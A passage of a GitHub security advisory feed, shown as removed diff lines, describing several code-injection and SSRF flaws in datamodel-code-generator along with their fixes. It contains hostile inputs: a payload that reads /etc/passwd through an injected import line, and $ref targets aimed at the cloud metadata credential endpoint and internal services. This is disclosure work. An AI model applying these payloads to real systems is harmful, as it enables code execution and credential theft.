-<p>Fix summary: apply the remote-ref gate to <code>file://</code> refs and local JSON Schema refs outside the input base path. In <code>0.62.0</code>, <code>--no-allow-remote-refs</code> blocks these references; the default compatibility mode emits a <code>FutureWarning</code> and users who intentionally rely on trusted external local refs can pass <code>--allow-remote-refs</code>.</p>
-<p>Release status: fixed in <code>0.62.0</code> for the documented <code>--no-allow-remote-refs</code> bypass, with a compatibility warning for the default behavior.</p>
-<p>Validation: <code>uv run --group test --extra http pytest tests/main/jsonschema/test_main_jsonschema.py</code> passed locally; <code>uv run --group fix ruff check src/datamodel_code_generator/parser/jsonschema.py tests/main/jsonschema/test_main_jsonschema.py</code> passed.</p>
-<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8359-h9fx-j6v9">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8359-h9fx-j6v9</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/2ff4a72b4550a2b2069754c5b075b1655067e5fb">https://github.com/koxudaxi/datamodel-code-generator/commit/2ff4a72b4550a2b2069754c5b075b1655067e5fb</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.62.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.62.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-8359-h9fx-j6v9">https://github.com/advisories/GHSA-8359-h9fx-j6v9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8359-h9fx-j6v9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:49:34.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code injection in via attacker-controlled `default_factory` schema field]]></title>
-        <id>https://github.com/advisories/GHSA-386q-5hp3-95m9</id>
-        <link href="https://github.com/advisories/GHSA-386q-5hp3-95m9"/>
-        <updated>2026-07-28T21:48:17.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>datamodel-code-generator</code> is vulnerable to code injection when generating Python models from an attacker-controlled JSON Schema, OpenAPI, YAML, JSON, Avro, Protobuf, or XSD schema. When a property carries a <code>"default_factory"</code> key, its value is interpolated verbatim — as a raw Python expression — into the generated <code>Field(default_factory=...)</code> / <code>field(default_factory=...)</code> call. Because this assignment is evaluated at class-definition time (i.e. on <code>import</code> of the generated module), an attacker who controls the schema controls a Python expression that runs in the consumer's process. No special CLI flags are required.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable chain spans the JSON-Schema-shaped parser and three sink locations (Pydantic v2, dataclass, msgspec):</p>
-<p><strong>Source — schema → <code>extras</code></strong>:</p>
-<ul>
-<li><code>src/datamodel_code_generator/parser/jsonschema.py:600-614</code> — <code>DEFAULT_FIELD_KEYS</code> includes the literal string <code>"default_factory"</code>.</li>
-<li><code>src/datamodel_code_generator/parser/jsonschema.py:457-459</code> — <code>JsonSchemaObject.__init__</code> stores any non-standard key (including <code>default_factory</code>) in <code>self.extras</code>.</li>
-<li><code>src/datamodel_code_generator/parser/jsonschema.py:797-812</code> — <code>get_field_extras</code> preserves <code>default_factory</code> through to the field model.</li>
-</ul>
-<p><strong>Sinks — <code>extras</code> → generated Python expression</strong>:</p>
-<ol>
-<li><p><code>src/datamodel_code_generator/model/pydantic_base.py:222-249</code>:</p>
-<pre><code class="language-python">default_factory = data.pop("default_factory", None)
-...
-if default_factory is not None:
-    field_arguments = [f"default_factory={default_factory}", *field_arguments]
-</code></pre>
-<p>The <code>default_factory</code> value is interpolated raw (no <code>repr()</code>, no validation).</p>
-</li>
-<li><p><code>src/datamodel_code_generator/model/dataclass.py:211</code>:</p>
-<pre><code class="language-python">f"{k}={v if k == 'default_factory' else repr(v)}"
-</code></pre>
-<p>Explicit special-case to skip <code>repr()</code> for <code>default_factory</code>.</p>
-</li>
-<li><p><code>src/datamodel_code_generator/model/msgspec.py:361</code> — same pattern as dataclass.</p>
-</li>
-</ol>
-<p>Because <code>default_factory</code> is in <code>DEFAULT_FIELD_KEYS</code>, no special CLI flag is needed to reach the sink. Any input format that uses the JSON-Schema-shaped parser (<code>jsonschema</code>, <code>openapi</code>, <code>yaml</code>, <code>json</code>, <code>dict</code>, <code>csv</code>) — and any input format that converts to it (<code>avro</code>, <code>protobuf</code>, <code>xmlschema</code>) — is in scope.</p>
-<h3 id="confirmed-poc-matrix">Confirmed PoC matrix</h3>
-<table>
-<thead>
-<tr>
-<th>Input file type</th>
-<th>Output model type</th>
-<th>Result</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>jsonschema</code></td>
-<td><code>pydantic_v2.BaseModel</code></td>
-<td>RCE on import</td>
-</tr>
-<tr>
-<td><code>jsonschema</code></td>
-<td><code>dataclasses.dataclass</code></td>
-<td>RCE on import</td>
-</tr>
-<tr>
-<td><code>jsonschema</code></td>
-<td><code>msgspec.Struct</code></td>
-<td>RCE on import</td>
-</tr>
-<tr>
-<td><code>jsonschema</code></td>
-<td><code>typing.TypedDict</code></td>
-<td>safe (TypedDict doesn't render <code>field()</code>; <code>default_factory</code> silently dropped)</td>
-</tr>
-<tr>
-<td><code>openapi</code></td>
-<td><code>pydantic_v2.BaseModel</code></td>
-<td>RCE on import</td>
-</tr>
-</tbody></table>
-<p>Other JSON-Schema-shaped inputs (<code>yaml</code>, <code>json</code>, <code>dict</code>, <code>csv</code>, <code>avro</code>, <code>protobuf</code>, <code>xmlschema</code>) follow the same code path and are expected to reproduce.</p>
-<h3 id="poc">PoC</h3>
-<p>Self contained Proof of Concept is available at my secret gist: <a href="https://gist.github.com/thegr1ffyn/9648b0fe4fcf7d569ac8e61dd11eebaf">https://gist.github.com/thegr1ffyn/9648b0fe4fcf7d569ac8e61dd11eebaf</a></p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Who's affected</strong>: any developer or CI pipeline that runs <code>datamodel-codegen</code> against a schema they didn't author themselves — third-party API specs, schemas pulled from a registry, vendored upstream <code>.json</code> / <code>.yaml</code> / <code>.avsc</code> / <code>.proto</code> / <code>.xsd</code> files, schemas fetched from a remote URL or introspection endpoint — <em>and</em> who imports the generated <code>.py</code>.</li>
-<li><strong>What it gains</strong>: arbitrary Python code execution in the importer's process at <code>import</code> time. The PoC copies <code>/etc/passwd</code> to a tmp file to demonstrate arbitrary read; the same primitive supports any operation the importing process can perform (filesystem write, environment exfiltration, secondary network calls, RCE on CI runners).</li>
-<li><strong>What it does NOT need</strong>: no special CLI flags, no custom templates, no <code>--extra-template-data</code>, no <code>--use-schema-description</code>. Default invocation against a malicious schema is sufficient.</li>
-<li><strong>What does block it</strong>: choosing <code>--output-model-type typing.TypedDict</code> (which doesn't render <code>field()</code> / <code>Field()</code> calls). All other supported output model types are vulnerable.</li>
-</ul>
-<h3 id="resolution">Resolution</h3>
-<p>The fix validates schema-provided <code>default_factory</code> values while extracting JSON Schema field extras. Only the supported factory names <code>dict</code>, <code>list</code>, and <code>set</code> are accepted; any other value now raises a generator error before code generation. Generator-created default factories for supported mutable defaults and optional nested models continue to use the existing code paths.</p>
-<h3 id="remediation">Remediation</h3>
-<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.2</code> or later.</p>
-<p>This issue affects <code>datamodel-code-generator</code> versions <code>&gt;= 0.17.0, &lt;= 0.60.1</code> and is fixed in <code>0.60.2</code>.</p>
-<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-386q-5hp3-95m9">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-386q-5hp3-95m9</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/17fc235e234cbcfaaadef8c74cb72c9687db0d1d">https://github.com/koxudaxi/datamodel-code-generator/commit/17fc235e234cbcfaaadef8c74cb72c9687db0d1d</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-386q-5hp3-95m9">https://github.com/advisories/GHSA-386q-5hp3-95m9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-386q-5hp3-95m9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:48:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to SSRF protection bypass via DNS rebinding]]></title>
-        <id>https://github.com/advisories/GHSA-vx7x-vcc2-c44g</id>
-        <link href="https://github.com/advisories/GHSA-vx7x-vcc2-c44g"/>
-        <updated>2026-07-28T21:45:50.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>datamodel-code-generator</code>'s anti-SSRF guard validates the resolved IP of a fetch target once and then lets <code>httpx</code> perform its own independent DNS resolution to connect, so the validated address is never pinned. A hostname that resolves to a public IP at validation time and a private IP at connection time (DNS rebinding) bypasses the guard and reaches loopback, link-local cloud-metadata endpoints (<code>169.254.169.254</code>), and other internal services — even with the default <code>allow_private_network=False</code>. This is a server-side request forgery reachable when the tool fetches an attacker-influenced URL (remote <code>$ref</code>, or <code>--url</code>).</p>
-<h3 id="details">Details</h3>
-<p>In <code>src/datamodel_code_generator/http.py</code>, <code>get_body()</code> calls <code>_validate_url_for_fetch()</code>, which resolves the host via <code>_get_ips_from_host()</code> (<code>socket.getaddrinfo</code>) and rejects non-global addresses:</p>
-<pre><code class="language-python">ips = _get_ips_from_host(host)            # resolution #1 (validation)
-if not ips: return
-if all(_is_safe_ip(ip) for ip in ips): return
-raise SchemaFetchError(...)               # blocks private/link-local/reserved
-</code></pre>
-<p>It then connects with a separate, independent resolution:</p>
-<pre><code class="language-python">response = httpx.get(current_url, ...)    # resolution #2 (connection) -- NOT pinned to #1
-</code></pre>
-<p>Nothing ties the connection to the IP that passed validation. Between the two resolutions a low-TTL attacker-controlled record can flip from a public address (passes the guard) to a private one (used by the connection). The redirect-handling loop in the same function does correctly re-validate each redirect URL, so this is specifically a TOCTOU/rebinding gap in the host-to-IP check, not a redirect issue.</p>
-<h3 id="poc">PoC</h3>
-<p>Self-contained reproducer: <a href="https://gist.github.com/thegr1ffyn/c1d54dd6ff2a4c0d7d0dabe00c4985f4">https://gist.github.com/thegr1ffyn/c1d54dd6ff2a4c0d7d0dabe00c4985f4</a> 
-It starts a loopback HTTP server standing in for an internal target and patches <code>socket.getaddrinfo</code> to return a public IP on the guard's lookup and <code>127.0.0.1</code> on httpx's  the standard deterministic way to demonstrate this TOCTOU class (the real-world trigger is a low-TTL rebinding DNS record the attacker controls). </p>
-<p>Reachability in normal use: the attacker registers a rebinding hostname and gets the tool to fetch <code>http://that-host/schema.json</code> either via <code>--url</code> or via a remote <code>$ref</code> in a supplied schema (remote refs are fetched on the default configuration).</p>
-<h3 id="impact">Impact</h3>
-<p>Server-side request forgery (CWE-918) via a time-of-check/time-of-use resolution gap (CWE-367). Any service or CI pipeline that runs <code>datamodel-code-generator</code> against attacker-influenced URLs is affected, including deployments that rely on the default private-network protection. Consequences include reading cloud instance-metadata credentials (<code>169.254.169.254</code>), reaching internal-only HTTP services, and port/host probing of the internal network, the document fetched from the internal target is also parsed and can be reflected into the generated output.</p>
-<h3 id="maintainer-status">Maintainer status</h3>
-<p>Confirmed by maintainer review and regression tests. The private fix PR was merged and released in <code>0.63.0</code>: <a href="https://github.com/koxudaxi/datamodel-code-generator-ghsa-vx7x-vcc2-c44g/pull/1">https://github.com/koxudaxi/datamodel-code-generator-ghsa-vx7x-vcc2-c44g/pull/1</a></p>
-<p>Fix summary: pin the validated DNS result set during the HTTP fetch so a host cannot resolve to a safe address during validation and a different address during connection.</p>
-<p>Release status: fixed in <code>0.63.0</code>; <code>0.62.0</code> and earlier are affected.</p>
-<p>Validation: <code>uv run --group test --extra http pytest tests/test_http.py</code> passed locally for DNS pinning and URL-fetch regression coverage; <code>uv run --group fix ruff check src/datamodel_code_generator/http.py tests/test_http.py</code> passed.</p>
-<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-vx7x-vcc2-c44g">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-vx7x-vcc2-c44g</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/25c8b7e497419eb20b230fa3318c04f9bebc5a6f">https://github.com/koxudaxi/datamodel-code-generator/commit/25c8b7e497419eb20b230fa3318c04f9bebc5a6f</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.63.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.63.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-vx7x-vcc2-c44g">https://github.com/advisories/GHSA-vx7x-vcc2-c44g</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vx7x-vcc2-c44g</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:45:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code execution on import via unescaped `validators` entries in --extra-template-data]]></title>
-        <id>https://github.com/advisories/GHSA-8m8r-38jm-f355</id>
-        <link href="https://github.com/advisories/GHSA-8m8r-38jm-f355"/>
-        <updated>2026-07-28T21:44:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When the Pydantic v2 output mode is in use, <code>datamodel-code-generator</code> reads a <code>validators</code> array from each model entry in the <code>--extra-template-data</code> file and synthesises a Pydantic <code>@field_validator(...)</code> decorator from each entry. The field names and the validator mode are interpolated into the decorator call wrapped in <em>unescaped</em> single quotes. A value containing <code>'</code> breaks out of the string literal, letting an attacker emit an arbitrary positional Python expression into the decorator. The expression is evaluated at class-definition time, i.e. the moment the developer imports the generated module. This is the same trust model as the recently-published GHSA-wjv6-jcfj-mf9r (extras-file comment injection) but the impact is full RCE rather than a docstring leak.</p>
-<h3 id="details">Details</h3>
-<p>Sink: <code>src/datamodel_code_generator/model/pydantic_v2/base_model.py</code>, <code>_process_validators</code> (lines 405–449, at tag <code>0.60.1</code> / commit <code>a321547e</code>):</p>
-<pre><code class="language-python">def _process_validators(self) -&gt; None:
-    validators = self.extra_template_data.get("validators")
-    if not validators:
-        return
-    ...
-    for validator in validators:
-        fields = validator.get("fields") or [validator.get("field")]
-        fields = [f for f in fields if f]
-        if not fields:
-            continue
-        function_path: str = validator["function"]
-        function_name = function_path.rsplit(".", 1)[-1]
-        mode = validator.get("mode", "after")
-        fields_str = ", ".join(f"'{f}'" for f in fields)     # (A) UNESCAPED
-        ...
-        mode_str = f"mode='{mode}'"                          # (B) UNESCAPED
-        prepared_validators.append({
-            "fields_str": fields_str,
-            "mode_str":   mode_str,
-            "method_name": method_name,
-            "function_name": function_name,
-            "mode": mode,
-        })
-        self._additional_imports.append(Import.from_full_path(function_path))  # (C)
-</code></pre>
-<p>The strings from (A) and (B) flow verbatim into <code>src/datamodel_code_generator/model/template/pydantic_v2/BaseModel.jinja2</code>:</p>
-<pre><code class="language-jinja">@field_validator({{ v.fields_str }}, {{ v.mode_str }})
-</code></pre>
-<p>There is no <code>repr()</code> call, no identifier check, and no quote-escaping.</p>
-<p>Secondary sink at (C): <code>Import.from_full_path(function_path)</code> splits on the last <code>.</code> and emits <code>from &lt;prefix&gt; import &lt;suffix&gt;</code>. A <code>;</code> in <code>function_path</code> therefore lands in the generated import line and runs as a statement at module load.</p>
-<h3 id="poc">PoC</h3>
-<p>A self-contained one-file PoC is available here: <a href="https://gist.github.com/thegr1ffyn/34d5c647e74487ffb2be27c76dace2aa">https://gist.github.com/thegr1ffyn/34d5c647e74487ffb2be27c76dace2aa</a></p>
-<h3 id="impact">Impact</h3>
-<p>Arbitrary code execution in the developer's interpreter / CI runner the moment the generated module is imported. Anyone who accepts a <code>--extra-template-data</code> file from an untrusted source is impacted:</p>
-<ul>
-<li>Pull requests adding or modifying project-local <code>*.template-data.json</code> / <code>.codegen.json</code> files consumed by a <code>make codegen</code> rule or pre-commit hook.</li>
-<li>Configuration snippets pasted from issue templates, READMEs, or third-party guides.</li>
-<li>Multi-tenant CI systems where one tenant's config file is read by another tenant's build.</li>
-</ul>
-<p>Same blast radius as GHSA-wjv6-jcfj-mf9r, but silent RCE rather than a docstring leak — significantly higher impact under the same threat model.</p>
-<blockquote>
-<p>Introduced in 0.52.1 by commit <a href="https://github.com/koxudaxi/datamodel-code-generator/commit/a2b27562"><code>a2b27562</code></a> (<em>Add --validators option for Pydantic v2 field validators</em>).</p>
-</blockquote>
-<h3 id="resolution">Resolution</h3>
-<p>The fix validates <code>validators</code> entries with Pydantic models before rendering them. Field names must be valid non-keyword Python identifiers, <code>function</code> must be a dotted Python identifier path, and <code>mode</code> must be one of Pydantic's supported validator modes. The generated decorator arguments now render field names with <code>repr()</code> and mode with <code>!r</code>, so validated values are still emitted as Python string literals.</p>
-<h3 id="remediation">Remediation</h3>
-<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.2</code> or later.</p>
-<p>This issue affects <code>datamodel-code-generator</code> versions <code>&gt;= 0.52.1, &lt;= 0.60.1</code> and is fixed in <code>0.60.2</code>.</p>
-<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8m8r-38jm-f355">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8m8r-38jm-f355</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/a43d02906111a2fdcaf13ee5b62eb2da85376f19">https://github.com/koxudaxi/datamodel-code-generator/commit/a43d02906111a2fdcaf13ee5b62eb2da85376f19</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-8m8r-38jm-f355">https://github.com/advisories/GHSA-8m8r-38jm-f355</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8m8r-38jm-f355</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:44:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to SSRF via JSON-Schema `$ref` to HTTP URL (silent by default)]]></title>
-        <id>https://github.com/advisories/GHSA-954p-556p-r752</id>
-        <link href="https://github.com/advisories/GHSA-954p-556p-r752"/>
-        <updated>2026-07-28T21:42:24.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>JSON-Schema <code>$ref</code> values pointing at HTTP or HTTPS URLs are silently dereferenced by <code>datamodel-code-generator</code> with no IP/host validation, no scheme allow-list, and redirects followed unconditionally. The <code>--allow-remote-refs</code> gate added in 0.56.0 defaults to <code>None</code>, which only emits a deprecation warning and then fetches the URL anyway; only explicit <code>--allow-remote-refs=false</code> blocks the request. The fetched body is parsed as a sub-schema and reflected verbatim into the generated <code>.py</code> source. As a result, any JSON-Schema document the developer feeds to <code>datamodel-codegen</code> — including documents authored by an attacker — can pivot to arbitrary internal addresses and leak the response into the generated code, with no developer cooperation beyond running the tool.</p>
-<h3 id="details">Details</h3>
-<p>Sink: <code>src/datamodel_code_generator/parser/jsonschema.py</code>, <code>_get_ref_body</code> (lines 4776–4793, at tag <code>0.60.1</code> / commit <code>a321547e</code>):</p>
-<pre><code class="language-python">def _get_ref_body(self, resolved_ref: str) -&gt; dict[str, YamlValue]:
-    if is_url(resolved_ref):
-        if not resolved_ref.startswith("file://") and self.http_local_ref_path is None:
-            if self.allow_remote_refs is False:
-                raise Error(f"Fetching remote $ref is disabled: {resolved_ref}...")
-            if self.allow_remote_refs is None:
-                warn_deprecated(                            # (A) warn only
-                    "behavior.remote-ref-default",
-                    details=f"Reference: {resolved_ref}",
-                    stacklevel=2,
-                )
-        return self._get_ref_body_from_url(resolved_ref)    # (B) fetch fires
-    return self._get_ref_body_from_remote(resolved_ref)
-</code></pre>
-<ul>
-<li>(A) emits a deprecation warning when <code>allow_remote_refs</code> is its default (<code>None</code>); execution falls through to (B).</li>
-<li>(B) routes the URL through <code>_get_text_from_url</code> → <code>get_body</code>, the same fetcher described in other report — no IP validation, redirects followed.</li>
-</ul>
-<p>The fetched body is then parsed as a sub-schema and merged into the model graph, so <code>description</code>, <code>title</code>, <code>properties</code>, etc. from the remote document end up in the generated <code>.py</code> source.</p>
-<p>Only affects users who installed the <code>[http]</code> extra (<code>pip install 'datamodel-code-generator[http]'</code>).</p>
-<h3 id="poc">PoC</h3>
-<p>A self-contained one-file PoC is available here: <a href="https://gist.github.com/thegr1ffyn/562a6972d7dc3f2869458ae93fc608c0">https://gist.github.com/thegr1ffyn/562a6972d7dc3f2869458ae93fc608c0</a></p>
-<h3 id="impact">Impact</h3>
-<p><strong>Who is impacted.</strong> Anyone running <code>datamodel-codegen</code> on a JSON-Schema or OpenAPI document of uncertain provenance, with the <code>[http]</code> extra installed. Real-world scenarios:</p>
-<ol>
-<li><strong>Trojaned OpenAPI document.</strong> A public REST API publishes <code>openapi.yaml</code>. One <code>$ref</code> points at <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code>; running <code>datamodel-codegen</code> against the spec from an EC2 instance leaks the IAM credentials into the generated client.</li>
-<li><strong>Customer-supplied JSON Schema.</strong> A B2B SaaS auto-generates client code from customer-uploaded schemas. The customer adds an HTTP <code>$ref</code> to <code>http://internal-admin:8080/users.json</code>; the response (e.g. JSON user list) ends up in the generated Python the SaaS hands back to the customer.</li>
-<li><strong>CI on a private network.</strong> A PR adds <code>schemas/inbound.json</code> with an HTTP <code>$ref</code> pointed at a service reachable only from the CI cluster's VPC; the CI runner fetches it and the generated <code>.py</code> leaks the response in PR artifacts.</li>
-</ol>
-<p>Higher real-world risk than the sibling CLI-flag SSRF (other SSRF in this report bundle) because the <em>schema author</em> chooses the destination — the developer doesn't have to type any URL.</p>
-<p><strong>Suggested fix.</strong></p>
-<ol>
-<li>Flip the default in <code>parser/base.py</code>: <code>allow_remote_refs: bool = False</code>, and remove the silent-fetch-with-warning fallback at <code>parser/jsonschema.py:4786-4791</code>.</li>
-<li>When fetching is allowed, apply the same IP/host validation proposed for other submitted SSRF report to both the initial <code>$ref</code> URL and every redirect target.</li>
-<li>Document HTTP <code>$ref</code> in a third-party schema as equivalent to running <code>curl</code> on the developer's host.</li>
-</ol>
-<h3 id="maintainer-resolution">Maintainer resolution</h3>
-<p>This <code>$ref</code> report is fixed by the same shared HTTP fetcher hardening that resolved GHSA-rfr2-mq9m-x2qx. The code landed through the GHSA-rfr2 private security PR koxudaxi/datamodel-code-generator-ghsa-rfr2-mq9m-x2qx#1 and was merged into the public repository as 5fdba4a09f2d7a9996a504975b7ef7d63e3715bb. Follow-up generated-file and coverage fixes were merged in koxudaxi/datamodel-code-generator#3279 and docs were synced in #3280. The patched release is 0.61.0.</p>
-<p>No separate net code diff remains in the GHSA-954 private PR because the shared HTTP fetcher patch is already present on <code>main</code>. This advisory remains separate because the affected entry point is remote JSON Schema/OpenAPI <code>$ref</code> resolution rather than direct CLI <code>--url</code> input.</p>
-<p>The fix does not flip the <code>--allow-remote-refs</code> compatibility default in this patch. Instead, it mitigates the SSRF issue by blocking localhost, loopback, private, link-local, reserved, and other non-public network targets by default, validating every redirect target before it is fetched, and requiring <code>--allow-private-network</code> / <code>allow_private_network=True</code> for trusted internal schema endpoints. Remote <code>$ref</code> fetching remains controlled by <code>--allow-remote-refs</code>; non-public/internal targets additionally require <code>--allow-private-network</code>.</p>
-<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-954p-556p-r752">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-954p-556p-r752</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/5fdba4a09f2d7a9996a504975b7ef7d63e3715bb">https://github.com/koxudaxi/datamodel-code-generator/commit/5fdba4a09f2d7a9996a504975b7ef7d63e3715bb</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.61.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.61.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-954p-556p-r752">https://github.com/advisories/GHSA-954p-556p-r752</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-954p-556p-r752</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:42:22.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to code injection via `x-python-import` / `customTypePath` in generated import statements]]></title>
-        <id>https://github.com/advisories/GHSA-5578-w22f-pfx9</id>
-        <link href="https://github.com/advisories/GHSA-5578-w22f-pfx9"/>
-        <updated>2026-07-28T21:40:21.000Z</updated>
-        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
-<p>A malicious input schema (OpenAPI / JSON Schema) can execute arbitrary Python code on the machine that <strong>imports</strong> the generated model. The <code>x-python-import</code> and <code>customTypePath</code> schema extensions flow, unsanitized, into the <code>import</code> statements datamodel-code-generator emits. A newline embedded in the extension value breaks out of the <code>from … import …</code> line and injects an attacker-controlled statement at module scope, which runs at import time. This is an unauthenticated, schema-content–driven remote code execution against any consumer of the generated code (e.g. arbitrary file read,the PoC exfiltrates <code>/etc/passwd</code>). It survives the v0.61.0 security release that fixed the related <code>x-python-type</code>, <code>default_factory</code>, GraphQL-union-description, and <code>validators</code> sinks  those fixes did not cover this sibling path.</p>
-<h4 id="details">Details</h4>
-<p>The sink is <code>Import.from_full_path</code> and <code>Imports.create_line</code>:</p>
-<ul>
-<li><code>src/datamodel_code_generator/imports.py:35</code> — <code>from_full_path()</code> only does <code>class_path.split(".")</code> and preserves every other character, <strong>including newlines</strong>:<pre><code class="language-python">@classmethod
-@lru_cache
-def from_full_path(cls, class_path: str) -&gt; Import:
-    split_class_path: list[str] = class_path.split(".")
-    return cls(import_=split_class_path[-1], from_=".".join(split_class_path[:-1]) or None)
-</code></pre>
-</li>
-<li><code>src/datamodel_code_generator/imports.py:64</code> — <code>create_line()</code> renders the result verbatim:<pre><code class="language-python">def create_line(self, from_: str | None, imports: set[str]) -&gt; str:
-    if from_:
-        return f"from {from_} import {', '.join(self._set_alias(from_, imports))}"
-    return "\n".join(f"import {i}" for i in self._set_alias(from_, imports))
-</code></pre>
-</li>
-</ul>
-<p>There is no check that the path segments are Python identifiers, contrast <code>validators._validate_dotted_python_identifier_path</code>, which the same v0.61.0 release added for the <code>validators</code> config, and <code>types.is_python_type_annotation</code>, added for <code>x-python-type</code>. The two extensions below were left unguarded.</p>
-<p>Two schema-controlled, <strong>default-config</strong> entry points reach this sink:</p>
-<ol>
-<li><strong><code>x-python-import</code></strong> — <code>src/datamodel_code_generator/parser/jsonschema.py:1851-1858</code> (<code>get_ref_data_type</code>):<pre><code class="language-python">x_python_import = ref_schema.extras.get("x-python-import")
-if isinstance(x_python_import, dict):
-    module = x_python_import.get("module")
-    type_name = x_python_import.get("name")
-    if module and type_name:
-        full_path = f"{module}.{type_name}"
-        import_ = Import.from_full_path(full_path)
-        self.imports.append(import_)
-</code></pre>
-</li>
-<li><strong><code>customTypePath</code></strong> — declared at <code>src/datamodel_code_generator/parser/jsonschema.py:438</code>, consumed at <code>:4118</code> and <code>:4365</code> via <code>get_data_type_from_full_path(custom_type_path, is_custom_type=True)</code> → the same <code>Import.from_full_path</code> sink.</li>
-</ol>
-<p><strong>Mechanism.</strong> With <code>name = "getcwd\nprint(...)"</code>, <code>full_path = "os.getcwd\nprint(...)"</code>. <code>from_full_path</code> splits only on <code>.</code>, so (provided the injected statement contains no <code>.</code>) it yields <code>from_="os"</code> and <code>import_="getcwd\nprint(...)"</code>. <code>create_line</code> then emits:</p>
-<pre><code class="language-python">from os import getcwd
-print(...)        # ← attacker statement at module scope, executes on import
-</code></pre>
-<p>The dot-split is the only constraint on the payload; it is trivially satisfied with attribute-free builtins (e.g. <code>print(*open('/etc/passwd'), file=open('/tmp/loot','w'), sep='', end='')</code> reads and exfiltrates a file using no <code>.</code>).</p>
-<p>None of the six v0.61.0 fix commits (<code>aec47bc4</code>, <code>b73abb5c</code>, <code>17fc235e</code>, <code>2c93c9b7</code>, <code>a43d0290</code>, <code>5fdba4a0</code>) touched <code>x-python-import</code>, <code>customTypePath</code>, or <code>imports.py</code>; <code>imports.py</code> was last modified ~5 months before the release. This is therefore an <strong>incomplete fix</strong>: the maintainer hardened sibling schema-controlled type/extension sinks but missed these two paths into the same import-generation code.</p>
-<h4 id="poc">PoC</h4>
